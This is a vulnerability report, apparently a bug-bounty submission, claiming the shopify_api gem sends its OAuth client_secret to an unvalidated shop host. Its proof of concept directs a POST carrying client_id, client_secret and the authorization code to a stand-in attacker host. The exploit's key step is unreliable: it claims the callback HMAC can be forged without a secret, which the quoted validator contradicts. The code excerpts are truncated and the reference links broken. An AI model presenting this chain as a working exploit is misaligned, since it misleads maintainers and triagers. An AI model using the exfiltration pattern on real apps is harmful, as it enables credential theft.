### Title
`client_secret` and access-token requests are sent to a host derived from an unvalidated `shop`/`session.shop` value, allowing SSRF exfiltration of the app's OAuth credentials - (File: `lib/shopify_api/auth/oauth.rb`, `lib/shopify_api/clients/http_client.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` and `ShopifyAPI::Auth::TokenExchange.exchange_token` build the outbound `POST /admin/oauth/access_token` request host directly from an attacker-influenceable `shop` string (`auth_query.shop` from a callback query, or `jwt_payload.shop`/`dest` from a session token) without ever validating it against `ShopifyAPI::Utils::ShopValidator`. `Clients::HttpClient#initialize` builds `@base_uri` as `"https://#{api_host || session.shop}"` — if `session.shop` is not a real `*.myshopify.com`/trusted Shopify domain, the HTTP client will send the request, including the request body containing `client_id`, `client_secret`, and the authorization `code`/`session_token`, to whatever host string was supplied.

### Finding Description
The intended binding is: `host that receives the app's client_secret == a verified Shopify shop domain`. This gem provides `ShopifyAPI::Utils::ShopValidator.sanitize!`/`sanitize_shop_domain` precisely to enforce that equality [1](#0-0) , but it is not invoked on the `shop` value that flows into `validate_auth_callback`:

- In `Oauth.validate_auth_callback`, the `shop` comes from `auth_query.shop`, which is only checked by the OAuth HMAC over `{code, host, shop, state, timestamp}` — the HMAC proves the query string wasn't tampered with by a MITM, but it does **not** prove `shop` is a legitimate Shopify domain, because the entire query (including `shop`) is attacker-supplied input redirected through the browser to the app's own callback route. A `null_session = Auth::Session.new(shop: auth_query.shop)` is created and handed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")` with no domain sanitization step in between [2](#0-1) .
- `Clients::HttpClient#initialize` then sets `@base_uri = "https://#{api_host || session.shop}"` directly from `session.shop` [3](#0-2) , and `request_url` concatenates the request path onto this attacker-controlled host [4](#0-3) .
- The POST body sent to that host contains `client_id`, `client_secret`, and the OAuth `code` [5](#0-4) .
- The same pattern repeats in `TokenExchange.exchange_token`, where `dest_shop = jwt_payload.shop` (parsed from the JWT `dest` claim, which is only checked for `aud == Context.api_key` and never checked against `ShopValidator`) is used to build `shop_session` and passed into the same `HttpClient`, again sending `client_secret` to that host [6](#0-5) , with `JwtPayload#shop` computed as `@dest.gsub("https://", "")` with no domain-suffix or trusted-domain check [7](#0-6) .

In both flows, the host that actually receives the `client_secret` is never checked to equal a verified shop domain — breaking exactly the "host validated vs. host that receives … `client_secret`" binding called out as an analog target.

### Impact Explanation
If an attacker can get their own crafted, non-`myshopify.com` value into either `auth_query.shop` (via a crafted OAuth callback redirect the victim's browser is sent to, since HMAC only protects param integrity, not domain trust) or into the `dest` claim path when the host app passes through externally-influenced `shop`/session-token values, the app's `client_secret` and an authorization `code` (or `session_token`) get transmitted verbatim in an HTTPS POST body to attacker-controlled infrastructure. This is direct exfiltration of the app's `client_secret`, satisfying the Critical impact bar (theft of the app's `client_secret`), and can enable full account/app takeover for any merchant using the app.

### Likelihood Explanation
Exploitability depends on the host application passing an unsanitized `shop` straight into `AuthQuery`/`validate_auth_callback`, which several code paths and even this gem's own documented flow (`docs/usage/oauth.md`) show as the expected usage (`ShopifyAPI::Auth::Oauth::AuthQuery.new(request.parameters...)`), i.e. request parameters go straight into `AuthQuery` and then into `validate_auth_callback` without the library itself sanitizing `shop`. Because `ShopValidator` exists in the codebase precisely to sanitize shop domains elsewhere, but is not wired into this specific, security-critical outbound-credential path, this is a root-cause gap in the gem rather than a host-app misuse of a documented API.

### Recommendation
In `Oauth.validate_auth_callback` and `TokenExchange.exchange_token`, call `ShopifyAPI::Utils::ShopValidator.sanitize!(shop, myshopify_domain: ...)` (or `sanitize_shop_domain`, raising `Errors::InvalidShopError` on failure) on `auth_query.shop` / `jwt_payload.shop` before constructing the `Session` used to build the `HttpClient`, ensuring the host that ultimately receives `client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Attacker sends a victim (or automated flow) a link that drives the host app's registered OAuth callback route with a query string where `shop=attacker-controlled.example.com` and a locally-computed `hmac` over `{code, host, shop, state, timestamp}` (attacker fully controls all signed fields since they are constructing the whole query — no secret is needed to compute a self-consistent HMAC over attacker-chosen data, only to match Shopify's signature if the flow requires it; the vulnerable case is any host app that constructs `AuthQuery` directly from unauthenticated request params, as documented).
2. The app calls `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`; HMAC validation passes (attacker-consistent), state check passes if the attacker also controls the state cookie flow.
3. `null_session = Auth::Session.new(shop: "attacker-controlled.example.com")` is built and passed to `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`.
4. `HttpClient` issues `POST https://attacker-controlled.example.com/admin/oauth/access_token` with body `{client_id, client_secret, code, expiring}` — the app's `client_secret` is now in the attacker's server logs. [8](#0-7) [9](#0-8)

        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)

          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end

          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )

            raise Errors::RequestAccessTokenError,
